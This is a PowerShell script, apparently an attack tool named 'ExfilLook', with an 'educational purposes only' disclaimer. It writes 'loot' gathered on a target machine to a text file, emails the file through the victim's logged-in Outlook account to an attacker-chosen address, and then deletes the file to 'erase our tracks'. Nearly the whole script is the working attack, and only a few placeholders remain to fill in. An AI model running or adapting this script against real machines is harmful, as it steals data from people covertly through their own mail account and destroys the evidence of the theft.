@"
__         __   ____   _        ___      __     ____     ______      _____      ___     _    ___________________________________________________________________________
|  \    ___) \  \  /  / \    ___) (_    _) \   |    \   |      )    (     )    (   \   | )  /                                                                           |
|   |  (__    \  \/  /   |  (__     |  |    |  |     |  |     /      \   /      \   |  |/  /      This tool is made for educational purposes only and should only       |
|   |   __)    |    |    |   __)    |  |    |  |     |  |    (   ()   ) (   ()   )  |     (       be tested on machines that you have permission to target.             |
|   |  (___   /  /\  \   |  (      _|  |_   |  |__   |  |__   \      /   \      /   |  |\  \                                                                            |
|__/       )_/  /__\  \_/    \____(      )_/      )_/      )___)    (_____)    (___/   |_)  \_____v.2.0_________________________________________________________________|

"@

# ---------------------------------------------------------------------------------- #
# Step 1: Test to see if the required processes are enabled on the machine           #
# ---------------------------------------------------------------------------------- #

# Check for Internet connectivity
if (Test-Connection -ComputerName 8.8.8.8 -Count 4 -Quiet) {

    # Check if Outlook is enabled
    $registryPath = "HKLM:\Software\Clients\Mail\Microsoft Outlook"
    $outlookEnabled = Test-Path -Path $registryPath

    if ($outlookEnabled) {
        #Microsoft Outlook is enabled on this system.
    } else {
        #ERROR: Microsoft Outlook is not enabled on this system. 
        exit
    }

} else {
    #ERROR: Machine isn't connected to the Internet.
    exit
}

# ---------------------------------------------------------------------------------- #
# Step 2: Check if an account is logged in on Outlook                                #          
# ---------------------------------------------------------------------------------- # 

# Create an Outlook application object
$outlook = New-Object -ComObject Outlook.Application

# Check if there are any active sessions (logged-in accounts)
if ($outlook.Session.Accounts.Count -gt 0) {
    Write-Host "An account is logged in to Outlook."
    foreach ($account in $outlook.Session.Accounts) {
        # There's an account logged in
    }
} else {
    Write-Host "No accounts are currently logged in to Outlook."
}

# Release the Outlook COM object
#[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null

# ---------------------------------------------------------------------------------- #
# Step 3: Enumerate the target data and redirect it to a text file                   #
# ---------------------------------------------------------------------------------- #

# Define the file path and name
$filePath = "PATH\FILENAME.txt" # FILL OUT

# Create a new text file
New-Item -ItemType File -Path $filePath -Force

Write-Output "ENTER COMMANDS IN THIS BLOCK !" > "PATH\FILENAME.txt" # FILL OUT

# ---------------------------------------------------------------------------------- #
# Step 4: Exfiltrate the text file containing the loot using Outlook                 #
# ---------------------------------------------------------------------------------- #

$ATTACHMENT = "PATH\FILENAME.txt"
$outlook = New-Object -comobject outlook.application
$email = $outlook.CreateItem(0)
$email.To = "EMAIL" # FILL OUT
$email.Subject = "ExfilLook" # CHANGE (Optional)
$email.Body = "Proof of Concept" # CHANGE (Optional)
$email.Attachments.add($ATTACHMENT) | Out-Null
$email.Send()
$outlook.Quit()

# ---------------------------------------------------------------------------------- #
# Step 5: Erase our tracks from the target machine                                   #
# ---------------------------------------------------------------------------------- #

del $HOME/FILENAME.txt
exit
